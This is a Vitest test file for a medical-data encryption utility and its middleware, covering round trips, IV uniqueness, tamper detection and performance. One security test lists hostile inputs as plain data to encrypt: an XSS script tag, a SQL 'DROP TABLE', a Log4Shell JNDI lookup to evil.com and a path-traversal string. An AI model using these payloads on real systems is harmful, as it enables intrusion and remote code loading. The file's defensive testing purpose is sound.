/* eslint-disable prettier/prettier */
import { encrypt, decrypt } from '../utils/encryptionUtils.js';
import encryptPayload from '../middleware/encryptPayload.js';
import decryptPayload from '../middleware/decryptPayload.js';
import { performance } from 'perf_hooks';
import { vi } from 'vitest';

// Set up environment variables for encryption tests
beforeAll(() => {
  process.env.ENCRYPTION_KEY_SECRET_v1 = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
  process.env.ENCRYPTION_KEY_CURRENT_VERSION = 'v1';
});

describe('Medical Data Encryption Tests', () => {
  
  describe('Server-side Encryption (Node.js crypto)', () => {
    const testData = {
      plaintext: 'Patient diagnosed with hypertension',
      sensitiveData: 'Confidential medical history: diabetes, heart condition',
      phi: 'John Doe, DOB: 1980-01-01, SSN: 123-45-6789'
    };

    test('should encrypt and decrypt data correctly', () => {
      const encrypted = encrypt(testData.plaintext);
      expect(encrypted).toBeDefined();
      expect(encrypted).not.toBe(testData.plaintext);
      expect(encrypted).toContain(':'); // Should contain separators (version:iv:authTag:encrypted)
      // Format should be version:iv:authTag:encrypted (4 parts)
      expect(encrypted.split(':')).toHaveLength(4);
      
      const decrypted = decrypt(encrypted);
      expect(decrypted).toBe(testData.plaintext);
    });

    test('should produce different encrypted values for same input', () => {
      const encrypted1 = encrypt(testData.plaintext);
      const encrypted2 = encrypt(testData.plaintext);
      expect(encrypted1).not.toBe(encrypted2);
      
      // But both should decrypt to the same value
      expect(decrypt(encrypted1)).toBe(testData.plaintext);
      expect(decrypt(encrypted2)).toBe(testData.plaintext);
    });

    test('should handle empty strings', () => {
      const encrypted = encrypt('');
      const decrypted = decrypt(encrypted);
      expect(decrypted).toBe('');
    });

    test('should handle special characters and unicode', () => {
      const specialData = '™®©℠ñáéíóú 中文 العربية 🏥💊';
      const encrypted = encrypt(specialData);
      const decrypted = decrypt(encrypted);
      expect(decrypted).toBe(specialData);
    });

    test('should handle large medical records', () => {
      const largeData = testData.sensitiveData.repeat(1000);
      const encrypted = encrypt(largeData);
      const decrypted = decrypt(encrypted);
      expect(decrypted).toBe(largeData);
    });

    test('should fail gracefully with invalid encrypted data', () => {
      // decrypt returns original text if not in encrypted format (less than 4 parts)
      expect(decrypt('invalid:data')).toBe('invalid:data');
      expect(decrypt('invalid:data:more')).toBe('invalid:data:more');
      expect(decrypt('noivdata')).toBe('noivdata');
      // Valid format requires version:iv:authTag:encrypted (4 parts), but with invalid data should throw
      expect(() => decrypt('v1:invalidiv:invalidauth:invaliddata')).toThrow();
    });
  });

  describe('Encryption Middleware Tests', () => {
    let req, res, next;

    beforeEach(() => {
      req = {
        body: {
          patientName: 'John Doe',
          diagnosis: 'Hypertension stage 2',
          treatment: 'ACE inhibitor medication, diet modification',
          history: 'Family history of cardiovascular disease',
          date: new Date().toISOString(),
          nonSensitiveField: 'This should not be encrypted'
        }
      };
      res = {
        decryptRecord: null
      };
      next = vi.fn();
    });

    test('encryptPayload should encrypt sensitive fields only', () => {
      const originalDiagnosis = req.body.diagnosis;
      const originalTreatment = req.body.treatment;
      const originalHistory = req.body.history;
      const originalNonSensitive = req.body.nonSensitiveField;

      encryptPayload(req, res, next);

      expect(req.body.diagnosis).not.toBe(originalDiagnosis);
      expect(req.body.treatment).not.toBe(originalTreatment);
      expect(req.body.history).not.toBe(originalHistory);
      expect(req.body.nonSensitiveField).toBe(originalNonSensitive);
      expect(next).toHaveBeenCalled();
    });

    test('decryptPayload should add decryption function to response', () => {
      decryptPayload(req, res, next);
      
      expect(res.decryptRecord).toBeDefined();
      expect(typeof res.decryptRecord).toBe('function');
      expect(next).toHaveBeenCalled();
    });

    test('decryptRecord function should decrypt encrypted fields', () => {
      // First encrypt the data
      encryptPayload(req, res, next);
      const encryptedRecord = { ...req.body };

      // Then setup decryption
      decryptPayload(req, res, vi.fn());
      const decryptedRecord = res.decryptRecord(encryptedRecord);

      expect(decryptedRecord.diagnosis).toBe('Hypertension stage 2');
      expect(decryptedRecord.treatment).toBe('ACE inhibitor medication, diet modification');
      expect(decryptedRecord.history).toBe('Family history of cardiovascular disease');
      expect(decryptedRecord.nonSensitiveField).toBe('This should not be encrypted');
    });

    test('should handle missing sensitive fields gracefully', () => {
      req.body = { patientName: 'Jane Doe' };
      
      encryptPayload(req, res, next);
      expect(next).toHaveBeenCalled();
      
      decryptPayload(req, res, vi.fn());
      const result = res.decryptRecord(req.body);
      expect(result.patientName).toBe('Jane Doe');
    });

    test('should handle null/undefined records in decryption', () => {
      decryptPayload(req, res, vi.fn());
      
      expect(res.decryptRecord(null)).toBeNull();
      expect(res.decryptRecord(undefined)).toBeUndefined();
    });
  });

  describe('Performance Tests', () => {
    const generateLargeRecord = (size) => {
      return 'Medical record data '.repeat(size);
    };

    test('encryption performance should be within acceptable limits', () => {
      const testSizes = [100, 1000, 5000]; // Different data sizes
      
      testSizes.forEach(size => {
        const data = generateLargeRecord(size);
        const startTime = performance.now();
        
        const encrypted = encrypt(data);
        const decrypted = decrypt(encrypted);
        
        const endTime = performance.now();
        const duration = endTime - startTime;
        
        expect(decrypted).toBe(data);
        // Expect encryption/decryption to complete within reasonable time
        expect(duration).toBeLessThan(100); // 100ms threshold
      });
    });

    test('batch encryption performance', () => {
      const records = Array.from({ length: 100 }, (_, i) => ({
        diagnosis: `Diagnosis ${i}`,
        treatment: `Treatment ${i}`,
        history: `History ${i}`
      }));

      const startTime = performance.now();
      
      records.forEach(record => {
        record.diagnosis = encrypt(record.diagnosis);
        record.treatment = encrypt(record.treatment);
        record.history = encrypt(record.history);
      });

      const endTime = performance.now();
      const duration = endTime - startTime;
      
      // Batch processing should complete within reasonable time
      expect(duration).toBeLessThan(1000); // 1 second for 100 records
    });
  });

  describe('Security Tests', () => {
    test('encrypted data should not contain original plaintext', () => {
      const sensitiveData = 'Patient has HIV positive status';
      const encrypted = encrypt(sensitiveData);
      
      expect(encrypted.toLowerCase()).not.toContain('hiv');
      expect(encrypted.toLowerCase()).not.toContain('positive');
      expect(encrypted.toLowerCase()).not.toContain('patient');
    });

    test('IV should be different for each encryption', () => {
      const data = 'Same medical record';
      const encrypted1 = encrypt(data);
      const encrypted2 = encrypt(data);
      
      // Format: version:iv:authTag:encrypted
      // Extract IVs (second part after version)
      const parts1 = encrypted1.split(':');
      const parts2 = encrypted2.split(':');
      const iv1 = parts1[1];
      const iv2 = parts2[1];
      
      expect(iv1).not.toBe(iv2);
    });

    test('should handle injection attempts safely', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'DROP TABLE records;',
        '${jndi:ldap://evil.com/x}',
        '../../../etc/passwd'
      ];

      maliciousInputs.forEach(input => {
        const encrypted = encrypt(input);
        const decrypted = decrypt(encrypted);
        expect(decrypted).toBe(input);
        expect(encrypted).not.toContain(input);
      });
    });
  });

  describe('Data Integrity Tests', () => {
    test('should detect tampering with encrypted data', () => {
      const data = 'Critical medical information';
      const encrypted = encrypt(data);
      
      // Tamper with the encrypted data
      const tampered = encrypted.slice(0, -1) + 'x';
      
      expect(() => decrypt(tampered)).toThrow();
    });

    test('should maintain data integrity across multiple operations', () => {
      const originalData = {
        diagnosis: 'Type 2 Diabetes Mellitus',
        treatment: 'Metformin 500mg twice daily',
        history: 'No known allergies, previous surgery in 2019'
      };

      // Simulate multiple encrypt/decrypt cycles
      let processed = { ...originalData };
      
      for (let i = 0; i < 10; i++) {
        processed.diagnosis = encrypt(processed.diagnosis);
        processed.treatment = encrypt(processed.treatment);
        processed.history = encrypt(processed.history);
        
        processed.diagnosis = decrypt(processed.diagnosis);
        processed.treatment = decrypt(processed.treatment);
        processed.history = decrypt(processed.history);
      }

      expect(processed.diagnosis).toBe(originalData.diagnosis);
      expect(processed.treatment).toBe(originalData.treatment);
      expect(processed.history).toBe(originalData.history);
    });
  });

  describe('Edge Cases and Error Handling', () => {
    test('should handle very long patient names', () => {
      const longName = 'A'.repeat(1000);
      const encrypted = encrypt(longName);
      const decrypted = decrypt(encrypted);
      expect(decrypted).toBe(longName);
    });

    test('should handle medical data with line breaks and formatting', () => {
      const formattedData = `
        Patient Symptoms:
        - Chest pain (8/10 severity)
        - Shortness of breath
        - Fatigue
        
        Assessment:
        Likely myocardial infarction
        
        Plan:
        1. Emergency cardiac catheterization
        2. Dual antiplatelet therapy
        3. Monitor in CCU
      `;
      
      const encrypted = encrypt(formattedData);
      const decrypted = decrypt(encrypted);
      expect(decrypted).toBe(formattedData);
    });

    test('should handle concurrent encryption operations', async () => {
      const data = 'Concurrent encryption test data';
      const promises = Array.from({ length: 50 }, () => 
        Promise.resolve(encrypt(data))
      );
      
      const results = await Promise.all(promises);
      
      // All should be different (due to different IVs)
      const uniqueResults = new Set(results);
      expect(uniqueResults.size).toBe(50);
      
      // All should decrypt to the same value
      results.forEach(encrypted => {
        expect(decrypt(encrypted)).toBe(data);
      });
    });
  });

  describe('Compliance and Audit Tests', () => {
    test('should not log sensitive data in error messages', () => {
      const consoleSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
      
      try {
        decrypt('invalid-encrypted-data');
      } catch (error) {
        // Error should not contain the invalid data
        expect(error.message).not.toContain('invalid-encrypted-data');
      }
      
      consoleSpy.mockRestore();
    });

    test('should maintain encryption metadata for audit', () => {
      const data = 'PHI data for audit test';
      const encrypted = encrypt(data);
      
      // Format: version:iv:authTag:encrypted
      // Should be able to identify this as encrypted data
      const parts = encrypted.split(':');
      expect(parts).toHaveLength(4);
      expect(parts[0]).toBe('v1'); // version
      expect(parts[1].length).toBe(24); // IV: 12 bytes = 24 hex chars
      expect(parts[2].length).toBe(32); // Auth tag: 16 bytes = 32 hex chars
      expect(parts[3].length).toBeGreaterThan(0); // Encrypted payload
    });
  });
});
